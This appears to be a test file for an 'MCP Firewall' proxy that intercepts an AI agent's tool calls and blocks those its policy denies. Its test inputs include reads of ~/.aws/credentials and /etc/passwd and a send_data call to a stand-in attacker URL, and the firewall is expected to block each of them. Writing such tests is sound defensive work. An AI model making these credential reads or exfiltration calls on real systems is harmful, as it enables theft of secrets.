/**
 * OWNER: Aarav — enforcement path tests (design doc §6, §10).
 *
 * 1. Unit: createInterceptor with fake evaluate/publish/forward, counting forwards.
 * 2. Integration: agent Client → proxy (InMemoryTransport) → real stdio fixture
 *    (tests/fixtures/counting-server.ts). Received counts are read directly from
 *    the fixture via upstream.callTool('get_call_counts'), bypassing the proxy.
 * 3. CLI smoke: spawn src/index.ts with a temp config and read the fixture's counts file.
 * 4. CLI with Kritish's demo/mock-server.ts as the downstream, the shipped config/firewall.yaml
 *    policy and Winston's real evaluator (read-only use of demo/* and src/security/*).
 * 5. Vertical slice: CLI → interceptor → publishEvent → event bus → monitor SSE on a free port.
 */
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:net';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { Client } from '@modelcontextprotocol/client';
import { StdioClientTransport } from '@modelcontextprotocol/client/stdio';
import { InMemoryTransport, SdkError, SdkErrorCode, type CallToolResult } from '@modelcontextprotocol/server';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { loadConfig } from '../src/config/load.js';
import { DUMMY_SECRET as MOCK_DUMMY_SECRET, MOCK_TOOL_NAMES, type MockToolName } from '../demo/mock-server.js';
import {
  BLOCKED_PREFIX,
  DOWNSTREAM_ERROR_PREFIX,
  FIREWALL_META_KEY,
  createInterceptor,
  type CallOptions,
  type FirewallMeta,
  type InterceptorDeps,
} from '../src/proxy/interceptor.js';
import { startProxyServer, type ProxyServerHandle } from '../src/proxy/server.js';
import { UpstreamUnavailableError, connectUpstream, type UpstreamConnection } from '../src/proxy/upstream.js';
import {
  FirewallEventSchema,
  LIMITS,
  toCanonicalToolName,
  type EvaluateToolCall,
  type FirewallEvent,
  type FirewallPolicy,
  type PolicyDecision,
  type ToolCallContext,
} from '../src/shared/contracts.js';

const repoRoot = resolve(import.meta.dirname, '..');
const fixturePath = resolve(import.meta.dirname, 'fixtures/counting-server.ts');
const DUMMY_SECRET = 'DUMMY-SECRET-DO-NOT-LEAK';
/** An argument value that must never show up in any response, event or log. */
const ARG_SECRET = 'ARG-VALUE-c0ffee-SHOULD-NOT-APPEAR';

const ALLOW: PolicyDecision = { decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: 'Tool is approved' };
const DENY: PolicyDecision = { decision: 'DENY', ruleId: 'PROTECTED_PATH', reason: 'Credential path is protected' };

const policy: FirewallPolicy = {
  defaultDecision: 'DENY',
  protectedPaths: [],
  deniedDestinations: [],
  allowedRoots: ['.'],
  allowedHosts: [],
  approvedTools: [],
  deniedTools: [],
  pathArgs: ['path'],
  destinationArgs: {},
  destructiveTools: [],
  writeTools: [],
};

// ---------------------------------------------------------------------------
// Unit harness
// ---------------------------------------------------------------------------

interface Harness {
  handler: ReturnType<typeof createInterceptor>;
  evaluated: ToolCallContext[];
  events: FirewallEvent[];
  logs: string[];
  forwards: { toolName: string; args: Record<string, unknown>; options: CallOptions }[];
}

const OK_RESULT: CallToolResult = { content: [{ type: 'text', text: 'downstream ok' }] };

function harness(overrides: Partial<InterceptorDeps> & { decision?: PolicyDecision } = {}): Harness {
  const h: Harness = { handler: undefined as never, evaluated: [], events: [], logs: [], forwards: [] };
  const { decision = ALLOW, ...deps } = overrides;
  let n = 0;
  h.handler = createInterceptor({
    serverId: 'demo',
    policy,
    evaluate: (ctx) => {
      h.evaluated.push(ctx);
      return decision;
    },
    publish: (event) => h.events.push(event),
    forward: async (toolName, args, options) => {
      h.forwards.push({ toolName, args, options });
      return OK_RESULT;
    },
    log: (line) => h.logs.push(line),
    newRequestId: () => `req-${++n}`,
    now: () => Date.parse('2026-10-24T02:00:00Z'),
    ...deps,
  });
  return h;
}

function textOf(result: CallToolResult): string {
  const first = result.content[0];
  return first && first.type === 'text' ? first.text : '';
}

function metaOf(result: CallToolResult): FirewallMeta | undefined {
  return result._meta?.[FIREWALL_META_KEY] as FirewallMeta | undefined;
}

function expectDenied(h: Harness, result: CallToolResult, ruleId: string): void {
  expect(h.forwards).toHaveLength(0);
  expect(result.isError).toBe(true);
  expect(textOf(result).startsWith(`${BLOCKED_PREFIX} (${ruleId}): `)).toBe(true);
  expect(metaOf(result)).toMatchObject({ decision: 'DENY', ruleId });
  expect(h.events).toHaveLength(1);
  expect(h.events[0]).toMatchObject({ decision: 'DENY', ruleId });
}

// ---------------------------------------------------------------------------
// Unit tests
// ---------------------------------------------------------------------------

describe('proxy / interceptor (unit)', () => {
  it('T01: ALLOW → forward called exactly once, result returned unchanged', async () => {
    const h = harness();
    const result = await h.handler('read_project_file', { path: 'README.md' });
    expect(h.forwards).toHaveLength(1);
    expect(h.forwards[0]).toMatchObject({ toolName: 'read_project_file', args: { path: 'README.md' } });
    expect(result).toBe(OK_RESULT);
    expect(h.events).toHaveLength(1);
    expect(h.events[0]).toMatchObject({
      requestId: 'req-1',
      serverId: 'demo',
      toolName: 'read_project_file',
      decision: 'ALLOW',
      ruleId: 'APPROVED_TOOL',
      timestamp: '2026-10-24T02:00:00.000Z',
    });
    expect(FirewallEventSchema.safeParse(h.events[0]).success).toBe(true);
  });

  it('passes the current session taint state into the evaluator context', async () => {
    const h = harness({ getSession: () => ({ tainted: true }) });
    await h.handler('write_file', { path: 'src/index.ts' });
    expect(h.evaluated[0]?.session).toEqual({ tainted: true });
  });

  it('T02: DENY → forward called zero times, recognizable MCP tool error returned', async () => {
    const h = harness({ decision: DENY });
    const result = await h.handler('read_sensitive_file', { path: '~/.aws/credentials' });
    expectDenied(h, result, 'PROTECTED_PATH');
    expect(textOf(result)).toBe(
      '[MCP Firewall] BLOCKED (PROTECTED_PATH): Credential path is protected. ' +
        'The request was not sent to the tool server. [request req-1]',
    );
    expect(metaOf(result)).toEqual({
      decision: 'DENY',
      ruleId: 'PROTECTED_PATH',
      reason: 'Credential path is protected',
      requestId: 'req-1',
    });
  });

  it('publishes the event before forwarding', async () => {
    const order: string[] = [];
    const h = harness({
      publish: () => order.push('publish'),
      forward: async () => {
        order.push('forward');
        return OK_RESULT;
      },
    });
    await h.handler('t', {});
    expect(order).toEqual(['publish', 'forward']);
  });

  describe('T06: invalid requests are rejected without evaluating or forwarding', () => {
    const cases: [string, unknown, unknown][] = [
      ['null args', 'tool', null],
      ['array args', 'tool', ['a', 'b']],
      ['string args', 'tool', 'path=/etc/passwd'],
      ['number args', 'tool', 42],
      ['class instance args', 'tool', new Date()],
      ['Map args', 'tool', new Map([['path', '/x']])],
      ['function value', 'tool', { fn: () => 1 }],
      ['symbol value', 'tool', { s: Symbol('x') }],
      ['nested Map value', 'tool', { nested: { m: new Map() } }],
      ['undefined value', 'tool', { path: undefined }],
      ['NaN value', 'tool', { n: Number.NaN }],
      ['sparse array value', 'tool', { list: [1, , 3] }],
      ['empty tool name', '', {}],
      ['oversized tool name', 'x'.repeat(LIMITS.identifier + 1), {}],
      ['numeric tool name', 123, {}],
      ['undefined tool name', undefined, {}],
      ['object tool name', { name: 'read' }, {}],
    ];
    for (const [label, toolName, args] of cases) {
      it(label, async () => {
        const h = harness();
        const result = await h.handler(toolName, args);
        expectDenied(h, result, 'INVALID_ARGUMENTS');
        expect(h.evaluated).toHaveLength(0);
        expect(FirewallEventSchema.safeParse(h.events[0]).success).toBe(true);
      });
    }

    it('cyclic / overly deep args', async () => {
      const cyclic: Record<string, unknown> = {};
      cyclic.self = cyclic;
      let deep: Record<string, unknown> = {};
      const root = deep;
      for (let i = 0; i < 200; i++) deep = (deep.next = {}) as Record<string, unknown>;
      for (const args of [cyclic, root]) {
        const h = harness();
        expectDenied(h, await h.handler('tool', args), 'INVALID_ARGUMENTS');
      }
    });

    it('a throwing getter or revoked proxy does not crash the handler', async () => {
      const getter = Object.defineProperty({}, 'path', {
        enumerable: true,
        get() {
          throw new Error(ARG_SECRET);
        },
      });
      const { proxy, revoke } = Proxy.revocable({}, {});
      revoke();
      for (const args of [getter, proxy]) {
        const h = harness();
        expectDenied(h, await h.handler('tool', args), 'INVALID_ARGUMENTS');
        expect(JSON.stringify(h.logs)).not.toContain(ARG_SECRET);
      }
    });

    it('invalid server id from deps → DENY, not forwarded', async () => {
      const h = harness({ serverId: '' });
      const result = await h.handler('tool', {});
      expect(h.forwards).toHaveLength(0);
      expect(textOf(result).startsWith(BLOCKED_PREFIX)).toBe(true);
    });
  });

  it('missing arguments become {}', async () => {
    const h = harness();
    await h.handler('tool', undefined);
    expect(h.evaluated[0]?.arguments).toEqual({});
    expect(h.forwards[0]?.args).toEqual({});
  });

  it('nested arguments reach the evaluator intact, and evaluated args are the forwarded args', async () => {
    const h = harness();
    const args = { path: 'a/b', options: { recursive: true, depth: 3, tags: ['x', { y: null }] } };
    await h.handler('tool', args);
    expect(h.evaluated[0]?.arguments).toEqual(args);
    expect(h.evaluated[0]?.arguments).not.toBe(args);
    expect(h.forwards[0]?.args).toBe(h.evaluated[0]?.arguments);
    expect(Object.isFrozen(h.forwards[0]?.args)).toBe(true);
    expect(Object.isFrozen((h.forwards[0]?.args.options as { tags: unknown[] }).tags[1])).toBe(true);
  });

  it('evaluator throws → DENY / EVALUATION_ERROR, forward called zero times', async () => {
    const h = harness({
      evaluate: () => {
        throw new Error(`boom ${ARG_SECRET}`);
      },
    });
    const result = await h.handler('tool', { path: ARG_SECRET });
    expectDenied(h, result, 'EVALUATION_ERROR');
    expect(JSON.stringify([result, h.events, h.logs])).not.toContain(ARG_SECRET);
  });

  describe('malformed decisions fail closed', () => {
    const bad: [string, unknown][] = [
      ['undefined', undefined],
      ['null', null],
      ['a string', 'ALLOW'],
      ['lowercase decision', { decision: 'allow', ruleId: 'APPROVED_TOOL', reason: 'x' }],
      ['unknown ruleId', { decision: 'ALLOW', ruleId: 'YOLO', reason: 'x' }],
      ['empty reason', { decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: '' }],
      ['oversized reason', { decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: 'r'.repeat(LIMITS.reason + 1) }],
      ['extra fields', { ...ALLOW, forward: true }],
      ['a Promise', Promise.resolve(ALLOW)],
    ];
    for (const [label, decision] of bad) {
      it(label, async () => {
        const h = harness({ evaluate: (() => decision) as unknown as EvaluateToolCall });
        expectDenied(h, await h.handler('tool', {}), 'EVALUATION_ERROR');
      });
    }

    it('a decision object mutated after it is returned does not flip the outcome', async () => {
      const decision = { decision: 'DENY', ruleId: 'DEFAULT_DENY', reason: 'no' } as PolicyDecision;
      const h = harness({
        evaluate: () => {
          queueMicrotask(() => Object.assign(decision, ALLOW));
          return decision;
        },
      });
      expectDenied(h, await h.handler('tool', {}), 'DEFAULT_DENY');
    });
  });

  it('publish throws → decision unchanged (ALLOW still forwards, DENY still blocks)', async () => {
    const publish = () => {
      throw new Error('monitor down');
    };
    const allowed = harness({ publish });
    expect(await allowed.handler('tool', {})).toBe(OK_RESULT);
    expect(allowed.forwards).toHaveLength(1);
    expect(allowed.logs.some((l) => l.includes('publish failed'))).toBe(true);

    const denied = harness({ publish, decision: DENY });
    const result = await denied.handler('tool', {});
    expect(denied.forwards).toHaveLength(0);
    expect(textOf(result).startsWith(BLOCKED_PREFIX)).toBe(true);
  });

  it('the evaluator mutating args does not change what is forwarded', async () => {
    let mutationThrew = false;
    const h = harness({
      evaluate: (ctx) => {
        try {
          (ctx.arguments as Record<string, unknown>).path = 'evil';
          ((ctx.arguments.nested as Record<string, unknown>) ?? {}).x = 'evil';
        } catch {
          mutationThrew = true;
        }
        return ALLOW;
      },
    });
    await h.handler('tool', { path: 'safe', nested: { x: 'safe' } });
    expect(mutationThrew).toBe(true);
    expect(h.forwards[0]?.args).toEqual({ path: 'safe', nested: { x: 'safe' } });

    // And an evaluator that lets a mutation error escape fails closed.
    const strict = harness({
      evaluate: (ctx) => {
        (ctx.arguments as Record<string, unknown>).path = 'evil';
        return ALLOW;
      },
    });
    expectDenied(strict, await strict.handler('tool', { path: 'safe' }), 'EVALUATION_ERROR');
  });

  it('the caller mutating args mid-flight does not change what is evaluated or forwarded', async () => {
    const args = { path: 'safe', nested: { x: 'safe' } };
    let release!: () => void;
    const gate = new Promise<void>((r) => (release = r));
    const h = harness({
      evaluate: (ctx) => {
        args.path = 'evil'; // concurrent mutation during evaluation
        expect(ctx.arguments.path).toBe('safe');
        return ALLOW;
      },
      forward: async (toolName, forwarded, options) => {
        h.forwards.push({ toolName, args: forwarded, options });
        await gate;
        return OK_RESULT;
      },
    });
    const pending = h.handler('tool', args);
    args.nested.x = 'evil'; // mutation while forward is in flight
    release();
    await pending;
    expect(h.forwards[0]?.args).toEqual({ path: 'safe', nested: { x: 'safe' } });
  });

  describe('T09: forward rejects → DOWNSTREAM ERROR, nothing leaks', () => {
    const cases: [string, unknown, string][] = [
      ['SDK timeout', new SdkError(SdkErrorCode.RequestTimeout, `timed out ${ARG_SECRET}`), 'timeout'],
      ['SDK connection closed', new SdkError(SdkErrorCode.ConnectionClosed, `closed ${ARG_SECRET}`), 'not_connected'],
      ['SDK not connected', new SdkError(SdkErrorCode.NotConnected, ARG_SECRET), 'not_connected'],
      ['upstream unavailable', new UpstreamUnavailableError(ARG_SECRET), 'not_connected'],
      ['generic Error', new Error(`tool echoed ${ARG_SECRET}`), 'failed'],
      ['non-Error throw', ARG_SECRET, 'failed'],
      ['code that is not a string', Object.assign(new Error(ARG_SECRET), { code: 42 }), 'failed'],
    ];
    for (const [label, error, kind] of cases) {
      it(label, async () => {
        const h = harness({
          forward: async () => {
            throw error;
          },
        });
        const result = await h.handler('tool', { path: ARG_SECRET });
        expect(result.isError).toBe(true);
        expect(textOf(result).startsWith(`${DOWNSTREAM_ERROR_PREFIX}: `)).toBe(true);
        expect(textOf(result)).toContain('[request req-1]');
        expect(metaOf(result)).toMatchObject({ decision: 'ALLOW', requestId: 'req-1', downstreamError: kind });
        expect(JSON.stringify([result, h.events, h.logs])).not.toContain(ARG_SECRET);
        expect(h.logs.some((l) => l.includes('downstream error'))).toBe(true);
      });
    }
  });

  it('T11: no argument value appears in any response, event or log', async () => {
    const args = { path: ARG_SECRET, nested: { token: ARG_SECRET, list: [ARG_SECRET] } };
    const outputs: unknown[] = [];
    for (const decision of [ALLOW, DENY]) {
      const h = harness({ decision });
      outputs.push(await h.handler('tool', args), h.events, h.logs);
    }
    const throwing = harness({
      evaluate: () => {
        throw new Error(ARG_SECRET);
      },
    });
    outputs.push(await throwing.handler('tool', args), throwing.events, throwing.logs);
    const invalidName = harness();
    outputs.push(await invalidName.handler(ARG_SECRET.repeat(10), args), invalidName.events, invalidName.logs);
    expect(JSON.stringify(outputs)).not.toContain(ARG_SECRET);
  });

  it('summary is bounded, sanitized and lists at most 8 key names', async () => {
    const args: Record<string, unknown> = {};
    for (let i = 0; i < 50; i++) args[`key_${i}_${'k'.repeat(60)}`] = ARG_SECRET;
    args['evil\nkey\u001b[31m'] = 1;
    const h = harness({ decision: DENY });
    await h.handler('weird name\n<script>', args);
    const event = h.events[0]!;
    expect(event.summary.length).toBeLessThanOrEqual(LIMITS.summary);
    expect(event.summary).not.toContain(ARG_SECRET);
    expect(event.summary).not.toMatch(/[\u0000-\u001f<>]/);
    expect(event.toolName).toBe('weird_name__script_');
    expect(event.summary.startsWith('weird_name__script_ args=[key_0_')).toBe(true);
    expect(event.summary.match(/key_\d+_/g)?.length ?? 0).toBeLessThanOrEqual(8);

    const small = harness();
    await small.handler('read_project_file', { path: 'README.md', limit: 10 });
    expect(small.events[0]?.summary).toBe('read_project_file args=[path,limit] → ALLOW APPROVED_TOOL');

    const many = harness();
    const nine = Object.fromEntries(Array.from({ length: 10 }, (_, i) => [`k${i}`, i]));
    await many.handler('t', nine);
    expect(many.events[0]?.summary).toBe('t args=[k0,k1,k2,k3,k4,k5,k6,k7,+2 more] → ALLOW APPROVED_TOOL');
  });

  it('passes the cancellation signal through to forward', async () => {
    const h = harness();
    const controller = new AbortController();
    await h.handler('tool', {}, { signal: controller.signal });
    expect(h.forwards[0]?.options.signal).toBe(controller.signal);
  });

  it('an event that cannot be built or validated is dropped; the decision still applies', async () => {
    // A clock returning NaN makes toISOString() throw.
    const allowed = harness({ now: () => Number.NaN });
    expect(await allowed.handler('tool', {})).toBe(OK_RESULT);
    expect(allowed.events).toHaveLength(0);
    expect(allowed.logs.some((l) => l.includes('not published'))).toBe(true);

    const denied = harness({ now: () => Number.NaN, decision: DENY });
    expect(textOf(await denied.handler('tool', {})).startsWith(BLOCKED_PREFIX)).toBe(true);
    expect(denied.forwards).toHaveLength(0);
  });
});

// ---------------------------------------------------------------------------
// Integration: agent Client → proxy → real stdio fixture
// ---------------------------------------------------------------------------

/** Minimal stand-in for Winston's evaluator: allow only policy.approvedTools. */
const allowlistEvaluator: EvaluateToolCall = (ctx, p) =>
  p.approvedTools.includes(toCanonicalToolName(ctx.serverId, ctx.toolName))
    ? { decision: 'ALLOW', ruleId: 'APPROVED_TOOL', reason: 'Tool is approved' }
    : { decision: 'DENY', ruleId: 'DEFAULT_DENY', reason: 'Tool is not approved' };

const fixturePolicy: FirewallPolicy = {
  ...policy,
  approvedTools: ['echo', 'structured', 'tool_error', 'hang', 'crash'].map((t) => `fixture/${t}`),
};

interface Stack {
  agent: Client;
  proxy: ProxyServerHandle;
  upstream: UpstreamConnection;
  events: FirewallEvent[];
  logs: string[];
  close(): Promise<void>;
}

async function startStack(timeoutMs = 10_000): Promise<Stack> {
  const upstream = await connectUpstream({
    id: 'fixture',
    command: process.execPath,
    args: ['--import', 'tsx', fixturePath],
    cwd: repoRoot,
    timeoutMs,
  });
  const events: FirewallEvent[] = [];
  const logs: string[] = [];
  const handler = createInterceptor({
    serverId: 'fixture',
    policy: fixturePolicy,
    evaluate: allowlistEvaluator,
    publish: (e) => events.push(e),
    forward: (name, args, options) => upstream.callTool(name, args, options),
    log: (line) => logs.push(line),
  });
  const [agentSide, proxySide] = InMemoryTransport.createLinkedPair();
  const proxy = await startProxyServer(upstream, handler, { transport: proxySide });
  const agent = new Client({ name: 'test-agent', version: '0.0.0' });
  await agent.connect(agentSide);
  return {
    agent,
    proxy,
    upstream,
    events,
    logs,
    async close() {
      await agent.close().catch(() => {});
      await proxy.close().catch(() => {});
      await upstream.close().catch(() => {});
    },
  };
}

async function counts(upstream: UpstreamConnection): Promise<Record<string, number>> {
  return JSON.parse(textOf(await upstream.callTool('get_call_counts', {}))) as Record<string, number>;
}

async function call(stack: Stack, name: string, args: Record<string, unknown> = {}): Promise<CallToolResult> {
  return (await stack.agent.callTool({ name, arguments: args })) as CallToolResult;
}

describe('proxy / integration (agent → proxy → stdio fixture)', () => {
  let stack: Stack;
  beforeAll(async () => {
    stack = await startStack();
  });
  afterAll(async () => {
    await stack?.close();
  });

  it('tools/list through the proxy is identical to the direct listing', async () => {
    const direct = await stack.upstream.listTools();
    const proxied = await stack.agent.listTools();
    expect(proxied.tools).toEqual(direct);
    expect(direct.map((t) => t.name).sort()).toEqual(
      ['crash', 'echo', 'get_call_counts', 'hang', 'read_file', 'structured', 'tool_error'].sort(),
    );
    expect(stack.agent.getInstructions()).toBeUndefined();
  });

  it('T01: allowed call reaches the fixture exactly once with the result unchanged', async () => {
    const before = (await counts(stack.upstream)).echo ?? 0;
    const result = await call(stack, 'echo', { text: 'hello' });
    expect(result.isError).toBeFalsy();
    expect(textOf(result)).toBe('hello');
    expect((await counts(stack.upstream)).echo).toBe(before + 1);
  });

  it('structured results and tool-level errors pass through', async () => {
    const structured = await call(stack, 'structured', { n: 21 });
    expect(structured.structuredContent).toEqual({ doubled: 42 });
    const direct = await stack.upstream.callTool('structured', { n: 21 });
    expect(structured).toEqual(direct);

    const toolError = await call(stack, 'tool_error');
    expect(toolError.isError).toBe(true);
    expect(textOf(toolError)).toBe('tool_error: deliberate failure');
    expect(metaOf(toolError)).toBeUndefined();
  });

  it('T02: denied call never reaches the fixture; the dummy secret never leaks', async () => {
    const before = await counts(stack.upstream);
    const result = await call(stack, 'read_file', { path: '~/.aws/credentials' });
    expect(result.isError).toBe(true);
    expect(textOf(result).startsWith(`${BLOCKED_PREFIX} (DEFAULT_DENY)`)).toBe(true);
    expect(await counts(stack.upstream)).toEqual(before);
    expect(JSON.stringify([result, stack.events, stack.logs])).not.toContain(DUMMY_SECRET);
  });

  it('unknown tools are denied without reaching the fixture', async () => {
    const before = await counts(stack.upstream);
    const result = await call(stack, 'does_not_exist', { x: 1 });
    expect(textOf(result).startsWith(BLOCKED_PREFIX)).toBe(true);
    expect(await counts(stack.upstream)).toEqual(before);
  });

  it('emits exactly one schema-valid event per call', async () => {
    const n = stack.events.length;
    await call(stack, 'echo', { text: 'x' });
    await call(stack, 'read_file', { path: 'x' });
    expect(stack.events.length).toBe(n + 2);
    for (const e of stack.events) expect(FirewallEventSchema.safeParse(e).success).toBe(true);
  });
});

describe('proxy / integration T09: downstream timeout and crash', () => {
  let stack: Stack;
  beforeAll(async () => {
    stack = await startStack(3_000);
  });
  afterAll(async () => {
    await stack?.close();
  });

  it('a hanging tool times out with a clear error and the proxy keeps working', async () => {
    const result = await call(stack, 'hang');
    expect(result.isError).toBe(true);
    expect(textOf(result).startsWith(`${DOWNSTREAM_ERROR_PREFIX}: the tool server did not respond in time`)).toBe(true);
    expect(metaOf(result)?.downstreamError).toBe('timeout');

    expect(textOf(await call(stack, 'echo', { text: 'still alive' }))).toBe('still alive');
    expect((await counts(stack.upstream)).hang).toBe(1);
  });

  it('after a crash every forward fails closed and DENY results stay BLOCKED', async () => {
    const crashed = await call(stack, 'crash');
    expect(crashed.isError).toBe(true);
    expect(textOf(crashed).startsWith(DOWNSTREAM_ERROR_PREFIX)).toBe(true);
    await expect.poll(() => stack.upstream.connected).toBe(false);

    const allowed = await call(stack, 'echo', { text: ARG_SECRET });
    expect(allowed.isError).toBe(true);
    expect(textOf(allowed)).toMatch(new RegExp(`^\\${DOWNSTREAM_ERROR_PREFIX}: the connection to the tool server is closed`));
    expect(metaOf(allowed)?.downstreamError).toBe('not_connected');

    const denied = await call(stack, 'read_file', { path: '~/.aws/credentials' });
    expect(textOf(denied).startsWith(BLOCKED_PREFIX)).toBe(true);

    await expect(stack.upstream.callTool('echo', {})).rejects.toBeInstanceOf(UpstreamUnavailableError);
    expect(JSON.stringify([allowed, stack.events, stack.logs])).not.toContain(ARG_SECRET);
  });
});

// ---------------------------------------------------------------------------
// CLI smoke: real src/index.ts process
// ---------------------------------------------------------------------------

describe('proxy / CLI smoke (src/index.ts)', () => {
  let dir: string;
  let countsFile: string;
  let agent: Client;
  let transport: StdioClientTransport;
  let stderr = '';

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-firewall-proxy-'));
    countsFile = join(dir, 'counts.json');
    const configPath = join(dir, 'firewall.yaml');
    const config = {
      server: {
        id: 'fixture',
        command: process.execPath,
        args: ['--import', 'tsx', fixturePath, '--counts-file', countsFile],
        cwd: repoRoot,
        timeoutMs: 10_000,
      },
      monitor: { enabled: false },
      policy: {
        defaultDecision: 'DENY',
        protectedPaths: ['~/.aws/credentials'],
        approvedTools: ['fixture/echo', 'fixture/read_file'],
        deniedTools: ['fixture/structured'],
      },
    };
    // JSON is valid YAML.
    writeFileSync(configPath, JSON.stringify(config, null, 2));

    transport = new StdioClientTransport({
      command: process.execPath,
      args: ['--import', 'tsx', resolve(repoRoot, 'src/index.ts'), '--config', configPath],
      cwd: repoRoot,
      stderr: 'pipe',
    });
    transport.stderr?.on('data', (chunk: Buffer) => (stderr += chunk.toString()));
    agent = new Client({ name: 'smoke-agent', version: '0.0.0' });
    await agent.connect(transport);
  });

  afterAll(async () => {
    await agent?.close().catch(() => {});
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  const readCounts = (): Record<string, number> => JSON.parse(readFileSync(countsFile, 'utf8')) as Record<string, number>;

  it('lists the downstream tools', async () => {
    const { tools } = await agent.listTools();
    expect(tools.map((t) => t.name)).toContain('echo');
    expect(tools.map((t) => t.name)).toContain('read_file');
  });

  it('a protected read and a denied tool never reach the downstream', async () => {
    const read = (await agent.callTool({
      name: 'read_file',
      arguments: { path: '~/.aws/credentials', note: ARG_SECRET },
    })) as CallToolResult;
    expect(textOf(read).startsWith(BLOCKED_PREFIX)).toBe(true);
    const denied = (await agent.callTool({ name: 'structured', arguments: { n: 1 } })) as CallToolResult;
    expect(textOf(denied).startsWith(BLOCKED_PREFIX)).toBe(true);
    const c = readCounts();
    expect(c.read_file ?? 0).toBe(0);
    expect(c.structured ?? 0).toBe(0);
  });

  it('the downstream count goes up only if the response was not BLOCKED', async () => {
    // Holds for both the deny-all evaluator stub and the real evaluator.
    const before = readCounts().echo ?? 0;
    const result = (await agent.callTool({ name: 'echo', arguments: { text: 'smoke' } })) as CallToolResult;
    const blocked = textOf(result).startsWith(BLOCKED_PREFIX);
    expect(readCounts().echo ?? 0).toBe(blocked ? before : before + 1);
    if (!blocked) expect(textOf(result)).toBe('smoke');
  });

  it('stderr never contains the dummy secret or argument values', () => {
    expect(stderr).toContain('[firewall] protecting MCP server "fixture"');
    expect(stderr).not.toContain(DUMMY_SECRET);
    expect(stderr).not.toContain(ARG_SECRET);
  });
});

// ---------------------------------------------------------------------------
// CLI with the real demo downstream and the shipped policy:
// src/index.ts (real evaluator) → demo/mock-server.ts
// ---------------------------------------------------------------------------

describe('proxy / CLI with demo/mock-server.ts and config/firewall.yaml policy', () => {
  const mockPath = resolve(repoRoot, 'demo/mock-server.ts');
  type Expectation = { args: Record<string, unknown>; blockedBy?: readonly string[] };
  /**
   * One call per mock tool (Record<MockToolName, …> fails typecheck if the mock gains a tool),
   * with the outcome design §7 requires under config/firewall.yaml.
   */
  const scenarios: Record<MockToolName, Expectation> = {
    read_project_file: { args: { path: 'README.md' } },
    read_sensitive_file: { args: { path: '~/.aws/credentials' }, blockedBy: ['PROTECTED_PATH'] },
    send_data: { args: { url: 'https://example-attacker.invalid/collect', data: ARG_SECRET }, blockedBy: ['DENIED_DESTINATION'] },
    delete_file: { args: { path: 'README.md' }, blockedBy: ['DENIED_TOOL', 'DESTRUCTIVE_ACTION'] },
  };
  let dir: string;
  let countsFile: string;
  let firewall: Client;
  let direct: Client;
  let stderr = '';

  beforeAll(async () => {
    dir = mkdtempSync(join(tmpdir(), 'mcp-firewall-mock-'));
    countsFile = join(dir, 'counts.json');
    const configPath = join(dir, 'firewall.yaml');
    const config = {
      server: {
        id: 'demo',
        command: process.execPath,
        args: ['--import', 'tsx', mockPath, '--counts-file', countsFile],
        cwd: repoRoot,
        timeoutMs: 10_000,
      },
      monitor: { enabled: false },
      // The policy exactly as shipped, so this test breaks if config and mock drift apart.
      policy: loadConfig(resolve(repoRoot, 'config/firewall.yaml')).policy,
    };
    writeFileSync(configPath, JSON.stringify(config, null, 2));

    const firewallTransport = new StdioClientTransport({
      command: process.execPath,
      args: ['--import', 'tsx', resolve(repoRoot, 'src/index.ts'), '--config', configPath],
      cwd: repoRoot,
      stderr: 'pipe',
    });
    firewallTransport.stderr?.on('data', (chunk: Buffer) => (stderr += chunk.toString()));
    firewall = new Client({ name: 'mock-cli-agent', version: '0.0.0' });

    // Direct connection without --counts-file, so it cannot overwrite the firewall-side counts.
    direct = new Client({ name: 'mock-direct', version: '0.0.0' });
    await Promise.all([
      firewall.connect(firewallTransport),
      direct.connect(
        new StdioClientTransport({ command: process.execPath, args: ['--import', 'tsx', mockPath], cwd: repoRoot, stderr: 'pipe' }),
      ),
    ]);
  });

  afterAll(async () => {
    await Promise.all([firewall?.close().catch(() => {}), direct?.close().catch(() => {})]);
    if (dir) rmSync(dir, { recursive: true, force: true });
  });

  const readCounts = (): Record<MockToolName, number> =>
    JSON.parse(readFileSync(countsFile, 'utf8')) as Record<MockToolName, number>;

  it('proxied tools/list equals the mock\'s direct listing', async () => {
    const [proxied, listed] = await Promise.all([firewall.listTools(), direct.listTools()]);
    expect(proxied.tools).toEqual(listed.tools);
    for (const name of MOCK_TOOL_NAMES) expect(proxied.tools.map((t) => t.name)).toContain(name);
  });

  it('T01: a benign project read is allowed, forwarded once and returned unchanged', async () => {
    expect(readCounts().read_project_file).toBe(0);
    const proxied = (await firewall.callTool({
      name: 'read_project_file',
      arguments: scenarios.read_project_file.args,
    })) as CallToolResult;
    expect(proxied.isError).toBeFalsy();
    expect(metaOf(proxied)).toBeUndefined();
    expect(readCounts().read_project_file).toBe(1);
    const viaDirect = await direct.callTool({ name: 'read_project_file', arguments: scenarios.read_project_file.args });
    expect(proxied).toEqual(viaDirect);
  });

  it('T02–T04: protected read, denied destination and delete are BLOCKED and never reach the mock', async () => {
    for (const name of MOCK_TOOL_NAMES) {
      const { args, blockedBy } = scenarios[name];
      if (!blockedBy) continue;
      const result = (await firewall.callTool({ name, arguments: args })) as CallToolResult;
      expect(result.isError, name).toBe(true);
      expect(textOf(result).startsWith(`${BLOCKED_PREFIX} (`), name).toBe(true);
      expect(metaOf(result)?.decision, name).toBe('DENY');
      expect(blockedBy, name).toContain(metaOf(result)?.ruleId);
      expect(readCounts()[name], name).toBe(0);
    }
  });

  it('stderr never contains the dummy secret or argument values', () => {
    expect(stderr).toContain('[firewall] protecting MCP server "demo"');
    expect(stderr).not.toContain(MOCK_DUMMY_SECRET);
    expect(stderr).not.toContain(ARG_SECRET);
  });
});

// ---------------------------------------------------------------------------
// Vertical slice: src/index.ts → interceptor → publishEvent → event bus → monitor SSE
// (tests/monitor.test.ts covers the monitor against its own bus; this covers the wiring.)
// ---------------------------------------------------------------------------

/** A loopback port that was free a moment ago (the schema does not accept port 0). */
async function freePort(): Promise<number> {
  return new Promise((resolvePort, reject) => {
    const server = createServer();
    server.once('error', reject);
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address() as { port: number };
      server.close(() => resolvePort(port));
    });
  });
}

